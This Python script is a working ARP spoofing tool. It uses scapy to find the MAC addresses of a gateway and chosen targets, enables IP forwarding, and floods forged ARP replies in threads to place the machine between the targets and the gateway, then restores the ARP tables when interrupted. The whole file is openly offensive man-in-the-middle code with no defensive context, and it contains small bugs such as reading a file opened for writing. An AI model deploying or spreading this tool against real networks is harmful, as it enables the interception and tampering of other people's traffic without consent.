#!/usr/bin/env python

from re import search
from os import geteuid
from datetime import date
from optparse import OptionParser
from subprocess import check_output
from threading import Thread, Lock
from time import strftime, localtime, sleep
from colorama import Fore, Back, Style
from scapy.all import ARP, Ether, srp, send, get_if_list

status_color = {
	'+': Fore.GREEN,
	'-': Fore.RED,
	'*': Fore.YELLOW,
	':': Fore.CYAN,
	' ': Fore.WHITE,
}

def get_time():
	return strftime("%H:%M:%S", localtime())
def display(status, data):
	print(f"{status_color[status]}[{status}] {Fore.BLUE}[{date.today()} {get_time()}] {status_color[status]}{Style.BRIGHT}{data}{Fore.RESET}{Style.RESET_ALL}")

def get_arguments(*args):
	parser = OptionParser()
	for arg in args:
		parser.add_option(arg[0], arg[1], dest=arg[2], help=arg[3])
	return parser.parse_args()[0]

def check_root():
	return geteuid() == 0

def scan(ip, timeout=1):
	arp = ARP(pdst=ip)
	ether = Ether(dst="ff:ff:ff:ff:ff:ff")
	packet = ether / arp
	result = srp(packet, timeout=timeout, verbose=False)[0]
	clients = []
	for _, received in result:
		clients.append({"ip": received.psrc, "mac": received.hwsrc})
	return clients
def display_clients(clients):
	print(f"{Fore.GREEN}IP{' '*18}MAC{Fore.WHITE}\n{'-'*37}{Fore.CYAN}")
	for ip, mac in clients.items():
		print(f"{ip:20}{mac}")
	print(Fore.RESET)
	print()

def get_mac(interface):
	iface_info = check_output(["ifconfig", interface])
	search_result = search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", iface_info.decode())
	if search_result:
		return search_result.group(0)
	else:
		-1

class ARP_Spoofer():
	ipv4_routing_file = "/proc/sys/net/ipv4/ip_forward"
	def __init__(self, gateway, targets, destination_mac, delay=5, verbose=False):
		self.gateway = gateway
		self.targets = targets
		self.destination_mac = destination_mac
		self.verbose = verbose
		self.delay = delay
		self.spoofing = False
		self.spoofing_threads = []
		self.number_of_packets = {self.gateway: 0}
		self.lock = Lock()
	def ipv4_routing(self, set):
		with open(ARP_Spoofer.ipv4_routing_file, 'w') as file:
			if set:
				file.write("1")
			else:
				file.write("0")
	def get_ipv4_routing_status(self):
		with open(ARP_Spoofer.ipv4_routing_file, 'w') as file:
			status = file.read()
		if status == "1":
			return True
		else:
			return False
	def spoof(self, target_ip):
		self.number_of_packets[target_ip] = 0
		arp_response_target = ARP(pdst=target_ip, hwdst=self.targets_ip_mac[target_ip], psrc=self.gateway, op=2)
		arp_response_gateway = ARP(pdst=self.gateway, hwdst=self.targets_ip_mac[self.gateway], psrc=target_ip, op=2)
		while self.spoofing:
			send(arp_response_target, verbose=False)
			send(arp_response_gateway, verbose=False)
			if self.verbose:
				with self.lock:
					display('+', arp_response_target.summary())
					display('+', arp_response_gateway.summary())
					self.number_of_packets[self.gateway] += 1
			self.number_of_packets[target_ip] += 1
			sleep(self.delay)
	def spoofing_handler(self, set):
		self.spoofing = set
		if set:
			for target in self.targets:
				self.spoofing_threads.append(Thread(target=lambda: self.spoof(target)))
				self.spoofing_threads[-1].start()
		elif len(self.spoofing_threads) != 0:
			for thread in self.spoofing_threads:
				thread.join()
			self.spoofing_threads = []
	def start(self):
		display(':', "Enabling IPv4 Routing")
		self.ipv4_routing(True)
		display('+', "Enabled IPv4 Routing")
		display(':', f"Gateway IP = {Back.MAGENTA}{self.gateway}{Back.RESET}")
		display(':', f"Total Number of Targets = {Back.MAGENTA}{len(self.targets)}{Back.RESET}")
		gateway_scan = scan(self.gateway)
		if len(gateway_scan) > 0:
			gateway_scan = gateway_scan[0]
		else:
			display('-', f"Gateway {Back.MAGENTA}{self.gateway}{Back.RESET} Not Found!")
			exit(0)
		self.targets_ip_mac = {gateway_scan["ip"]: gateway_scan["mac"]}
		targets_not_found = []
		for target in self.targets:
			target_scan = scan(target)
			if target_scan == []:
				display('-', f"Target {Back.MAGENTA}{target}{Back.RESET} not found!")
				targets_not_found.append(target)
				continue
			else:
				target_scan = target_scan[0]
			self.targets_ip_mac[target] = target_scan["mac"]
		for target in targets_not_found:
			self.targets.remove(target)
		display_clients(self.targets_ip_mac)
		display(':', f"Destination MAC = {self.destination_mac}")
		display(':', "Staring the Spoofing Threads")
		self.spoofing_handler(True)
		display('+', "Done Starting the Spoofing Threads")
	def restore(self):
		for target in self.targets:
			arp_response_target = ARP(pdst=target, hwdst=self.targets_ip_mac[target], psrc=self.gateway, hwsrc=self.targets_ip_mac[self.gateway], op=2)
			arp_response_gateway = ARP(pdst=self.gateway, hwdst=self.targets_ip_mac[self.gateway], psrc=target, hwsrc=self.targets_ip_mac[target], op=2)
			send(arp_response_target, verbose=False)
			send(arp_response_gateway, verbose=False)
			if self.verbose:
				display('+', f"Sent ARP Response to {target} : {self.gateway} is at {self.targets_ip_mac[self.gateway]}")
				display('+', f"Sent ARP Response to {self.gateway} : {target} is at {self.targets_ip_mac[target]}")
	def stop(self):
		display(':', "Stopping the Spoofing Threads")
		self.spoofing_handler(False)
		display('+', "Done Stopping the Spoofing Threads")
		display(':', "Disabling IPv4 Routing")
		self.ipv4_routing(False)
		display('+', "Disabled IPv4 Routing")
		display(':', "Restoring the Network Working to it's Default")
		self.restore()
		display(':', "Done Restoring the Network Working to it's Default")
		total_packets = 0
		print(f"{Fore.GREEN}IP{' '*18}MAC{' '*22}Packets Sent{Fore.WHITE}\n{'-'*71}{Fore.CYAN}")
		for ip, mac in self.targets_ip_mac.items():
			packets = self.number_of_packets[ip]
			print(f"{ip:20}{mac:25}{packets}")
			total_packets += packets
		print(Fore.RESET)
		display(':', f"Total Number of Packets Sent = {Back.MAGENTA}{total_packets}{Back.RESET}")
		self.number_of_packets = {self.gateway: 0}
		print('\n')

if __name__ == "__main__":
	data = get_arguments(('-g', "--gateway", "gateway", "IP Address of Gateway of the Network"),
		      			 ('-t', "--target", "target", "IP Address of Target/Targets to Spoof (seperated by ',')"),
					     ('-i', "--interface", "interface", "Interface on which to Spoof"),
						 ('-d', "--delay", "delay", "Delay between sending ARP Packets to the Targets (Default = 5 seconds)"),
						 ('-l', "--load", "load", "Load Targets from a file"))
	if not check_root():
		display('-', f"This Program requires {Back.MAGENTA}root{Back.RESET} Privileges")
		exit(0)
	if not data.gateway:
		display('-', "Please specify a Gateway")
		exit(0)
	if not data.target:
		if not data.load:
			display('-', "Please specify the Target/Targets")
		else:
			try:
				with open(data.load, 'r') as file:
					data.target = file.read().split('\n')
				data.target = [target for target in data.target if target != '']
			except FileNotFoundError:
				display('-', "File not Found!")
				exit(0)
			except:
				display('-', "Error in Reading the File")
				exit(0)
	else:
		data.target = data.target.split(',')
	if not data.interface:
		display('-', "Please specify an Interface")
		display(':', f"Available Interfaces : {Back.MAGENTA}{get_if_list()}{Back.RESET}")
	if not data.delay:
		display('*', "No Delay specified!")
		data.delay = 5
	else:
		data.delay = float(data.delay)
	display(':', f"Setting the Delay to {Back.MAGENTA}{data.delay}{Back.RESET} seconds")
	arp_spoofer = ARP_Spoofer(data.gateway, data.target, get_mac(data.interface), delay=data.delay, verbose=True)
	arp_spoofer.start()
	try:
		input()
	except KeyboardInterrupt:
		with arp_spoofer.lock:
			print()
			display('*', "Keyboard Interrupt Detected")
			display(':', "Stopping the ARP Spoofer")
	arp_spoofer.stop()
	display('+', "Stopped the ARP Spoofer")
	display(':', "Exiting the Program")